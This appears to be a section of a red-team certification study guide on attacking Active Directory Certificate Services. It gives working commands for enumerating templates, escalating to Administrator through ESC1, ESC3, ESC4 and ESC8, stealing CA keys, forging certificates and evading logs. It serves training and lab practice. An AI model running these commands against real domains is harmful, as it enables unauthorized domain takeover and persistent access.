## 13. Active Directory Certificate Services (ADCS)

ADCS is one of the most reliable domain-escalation paths and one of the most logged. Treat every certificate request as an audit event.

> **Scope note:** the CRTO curriculum covers ADCS, but which ESC paths appear on your exam depends on the lab build. Learn ESC1, ESC3, ESC4, ESC6, ESC8, and ESC9/ESC10 at minimum, and verify the CA/template configuration in the lab.

### 13.1 Concepts

- A **CA** issues certificates. Templates define who can enrol and what the certificate can be used for.
- A certificate with **Client Authentication** EKU can be used for Kerberos PKINIT — i.e., you can turn it into a TGT with `Rubeus asktgt /certificate:`.
- The dangerous pattern is a template that lets a low-privileged user **specify the subject/SAN** (so they can ask for an admin's identity) or that is writable (so they can make it do so).
- A **forged certificate** signed by a CA private key (DPERSIST-1) is valid without any request — the persistence variant.

### 13.2 Enumeration

```text
# Certify (Windows, via Beacon)
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable /currentuser
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /enrolleeSuppliesSubject
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /domain:<trusted-domain>
```

```bash
# Certipy (Linux operator side)
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -vulnerable -stdout
certipy find -u <user>@<domain> -p <pass> -dc-ip <dc> -show-admins -stdout
```

**Read the output for:** CA name, template name, enrollment rights, EKUs, `ENROLLEE_SUPPLIES_SUBJECT`, `CT_FLAG_NO_SECURITY_EXTENSION`, and whether you can write to the template or CA.

### 13.3 The ESC paths

| Path | Misconfiguration | Exploit | Noise |
|---|---|---|---|
| **ESC1** | Enrollee supplies subject + Client Auth EKU + low-priv enrol | Request a cert with `SAN=administrator` | Medium; 4886/4887 |
| **ESC2** | Any Purpose / no EKU + low-priv enrol | Same, usable for any service | Medium |
| **ESC3** | Enrollment Agent template | Enrol as agent, then request on behalf of admin | Medium |
| **ESC4** | Writable template | Modify template to ESC1, then enrol | High; 5136 + template change |
| **ESC5** | Writable CA/PKI object | Take over CA or template | High |
| **ESC6** | `EDITF_ATTRIBUTESUBJECTALTNAME2` on CA | Supply SAN in any request | Medium |
| **ESC7** | `ManageCA` / `ManageCertificates` | Approve/issue requests, add officer | High |
| **ESC8** | HTTP enrollment endpoint + NTLM | Relay DC/machine auth to `/certsrv` | High; relay |
| **ESC9** | `CT_FLAG_NO_SECURITY_EXTENSION` | Change `userPrincipalName`, request without SID extension | Medium |
| **ESC10** | Weak certificate mapping | Manipulate UPN/SID mapping | Medium |
| **ESC11** | RPC relay to CA | Relay NTLM to ICPR | High |

### 13.4 Requesting and using a certificate

#### ESC1 / ESC6 (supply a subject)

```text
execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:<ca-host>\<ca-name> /template:<template> /altname:<domain>\Administrator

# Certify prints a PEM + private key. Convert to PFX on the operator side:
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
```

```bash
# Certipy all-in-one
certipy req -u <user>@<domain> -p <pass> -ca <ca-host>\<ca-name> -template <template> -upn administrator@<domain> -target <ca-host>
certipy auth -pfx administrator.pfx -dc-ip <dc>
```

```text
# Turn the certificate into a TGT (Rubeus)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:<domain> /enctype:aes256 /password:<pfx-password> /certificate:<base64-pfx> /nowrap
```

#### ESC3 (enrollment agent)

```text
# 1. Request an enrollment-agent certificate
Certify.exe request /ca:<ca>\<name> /template:EnrollmentAgent

# 2. Request a certificate on behalf of an admin, using the agent cert
Certify.exe request /ca:<ca>\<name> /template:User /onbehalfof:<domain>\Administrator /enrollcert:<agent.pfx> /enrollcertpw:<pass>
```

#### ESC4 (writable template)

```bash
# Certipy can modify the template, request, and restore it
certipy template -u <user>@<domain> -p <pass> -template <template> -save-old
certipy req -u <user>@<domain> -p <pass> -ca <ca> -template <template> -upn administrator@<domain>
certipy template -u <user>@<domain> -p <pass> -template <template> -restore
```

#### ESC8 (relay)

```bash
# Relay machine/DC auth to the HTTP enrollment endpoint
certipy relay -target http://<ca-host>/certsrv/certfnsh.asp -ca <ca-host>\<ca-name> -template DomainController
# Trigger coercion (PrinterBug/PetitPotam) in parallel, then authenticate with the resulting cert
```

**OPSEC:** the CA logs requests (4886 requested, 4887 issued, 4888 denied). Template edits are 5136. Relays are visible as NTLM relay and unusual HTTP to the CA. Use the narrowest template and restore any modification.

### 13.5 Persistence: forged certificates (DPERSIST-1)

If you can extract the CA's private key (usually from the CA host, as admin/SYSTEM), you can forge certificates for any user, valid until the CA certificate expires — no further requests, no CA logs.

```text
# 1. Extract the CA certificate + private key
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine
mimikatz !crypto::certificates /systemstore:local_machine /export

# 2. Convert to PFX
openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx

# 3. Forge a certificate for an admin
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword <pass> --Subject "CN=User" --SubjectAltName "administrator@<domain>" --NewCertPath fake.pfx --NewCertPassword <pass>

# 4. Use it for a TGT
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:<domain> /enctype:aes256 /password:<pass> /certificate:<base64-fake-pfx> /nowrap
```

**OPSEC:** no CA request is logged (the certificate is forged), but the TGT request and the use of a certificate whose serial is not in the CA database can be anomalous. This is a persistence technique — use it only when persistence is part of the objective, and clean up the exported keys.

### 13.6 ADCS troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `Certify find` shows nothing | No LDAP access / wrong CA | Use `-domain` / alternate creds; check `cas` |
| Request denied | Enrolment rights or approval required | Check template ACLs; ESC7 if pending |
| `CERTSRV_E_...` | Template requires approval | Use an officer account or ESC7 |
| Cert works but no TGT | Missing Client Auth EKU / wrong user | Check EKU; use `asktgt /enctype:aes256` |
| PFX import fails | Wrong password / format | Convert with OpenSSL; verify password |
| ESC8 relay fails | EPA/HTTPS enforced, or no coercion | Check endpoint; use a different coercion |

